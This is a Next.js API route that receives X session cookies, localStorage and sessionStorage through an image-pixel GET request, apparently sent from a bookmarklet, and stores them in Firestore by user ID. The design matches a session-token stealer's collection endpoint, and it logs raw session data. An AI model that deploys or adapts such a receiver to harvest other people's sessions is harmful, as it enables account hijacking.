import { NextRequest, NextResponse } from 'next/server'
import { adminDb } from '@/lib/firebase-admin'

export async function GET(request: NextRequest) {
  console.log('🔐 Image-based session capture endpoint called')
  
  try {
    const url = new URL(request.url)
    const dataParam = url.searchParams.get('data')
    
    console.log('📊 Request details:', {
      hasData: !!dataParam,
      dataLength: dataParam?.length || 0,
      userAgent: request.headers.get('user-agent'),
      referer: request.headers.get('referer')
    })
    
    if (!dataParam) {
      console.log('❌ No data parameter provided')
      // Return a 1x1 transparent pixel
      const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64')
      return new NextResponse(pixel, {
        status: 200,
        headers: {
          'Content-Type': 'image/png',
          'Cache-Control': 'no-cache'
        }
      })
    }

    let sessionData, userId
    try {
      console.log('🔍 Parsing session data...')
      const decoded = decodeURIComponent(dataParam)
      console.log('📝 Decoded data length:', decoded.length)
      
      const parsed = JSON.parse(decoded)
      sessionData = parsed.sessionData
      userId = parsed.userId
      
      console.log('✅ Session data parsed successfully:', {
        userId,
        hasCookies: !!sessionData?.cookies,
        cookieCount: Object.keys(sessionData?.cookies || {}).length,
        hasLocalStorage: !!sessionData?.localStorage,
        hasSessionStorage: !!sessionData?.sessionStorage
      })
      
    } catch (e) {
      console.error('❌ Failed to parse session data:', e)
      console.log('Raw data param (first 200 chars):', dataParam.substring(0, 200))
      
      // Return error pixel (red)
      const errorPixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==', 'base64')
      return new NextResponse(errorPixel, {
        status: 200,
        headers: {
          'Content-Type': 'image/png',
          'Cache-Control': 'no-cache'
        }
      })
    }
    
    // Basic validation
    if (!sessionData || !sessionData.cookies || !userId) {
      console.error('Invalid session data or missing userId')
      // Return error pixel
      const errorPixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==', 'base64')
      return new NextResponse(errorPixel, {
        status: 200,
        headers: {
          'Content-Type': 'image/png',
          'Cache-Control': 'no-cache'
        }
      })
    }

    console.log('🔐 Image-based X session capture for user:', userId)

    // Store the captured X session data
    await adminDb.collection('x_sessions').doc(userId).set({
      cookies: sessionData.cookies,
      localStorage: sessionData.localStorage || {},
      sessionStorage: sessionData.sessionStorage || {},
      userAgent: sessionData.userAgent || '',
      capturedAt: new Date(),
      capturedUrl: sessionData.url || 'x.com',
      isValid: true,
      captureMethod: 'bookmarklet_image'
    })

    console.log('✅ X session data captured via image endpoint')

    // Return success pixel (green)
    const successPixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64')
    return new NextResponse(successPixel, {
      status: 200,
      headers: {
        'Content-Type': 'image/png',
        'Cache-Control': 'no-cache',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET',
        'Access-Control-Allow-Headers': 'Content-Type'
      }
    })

  } catch (error) {
    console.error('❌ Error in image-based session capture:', error)
    
    // Return error pixel
    const errorPixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==', 'base64')
    return new NextResponse(errorPixel, {
      status: 200,
      headers: {
        'Content-Type': 'image/png',
        'Cache-Control': 'no-cache'
      }
    })
  }
}
